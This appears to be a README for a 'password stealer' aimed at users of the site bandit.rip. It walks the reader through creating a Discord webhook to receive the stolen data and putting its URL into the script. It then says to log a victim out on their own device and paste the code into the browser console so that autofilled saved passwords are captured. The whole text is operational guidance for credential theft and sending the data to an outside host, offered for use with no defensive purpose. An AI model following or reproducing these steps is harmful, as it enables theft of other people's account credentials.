# bandit.rip-PASSWORD-STEALER


-Step 1: Replace the webhook link

    Before running the code, you need to replace the placeholder webhook link with your own Discord webhook link.
    Open the text doucument file containing the code in a text editor or code editor.
    Search for the line const webhookUrl = "YOUR_WEBHOOK_LINK";.
    Replace "YOUR_WEBHOOK_LINK" with your actual Discord webhook URL. It should look something like https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz.
    Save the JavaScript file after making the changes. 


-Step 2: Create a Discord webhook

    Open Discord and go to the server where you want to create the webhook.
    Right-click on the channel where you want the webhook messages to appear and select "Edit Channel" from the context menu.
    In the channel settings, navigate to the "Integrations" tab.
    Click on the "Webhooks" option and then click the "Create Webhook" button.
    Provide a name for the webhook (e.g., "Password Stealer").
    Once you've configured the webhook settings, click the "Copy Webhook URL" button to copy the webhook URL to your clipboard.
    Now, you can replace "YOUR_WEBHOOK_LINK" in the html code with the webhook URL you just copied.


-Step 3: How to run it

    Get onto bandit.rip and logout of their account - if the password hass been saves on the users device it will work.
    Access the browser console by pressing (cnrtl + shift + i), copying the updated code, pasting it into the console, and running it.
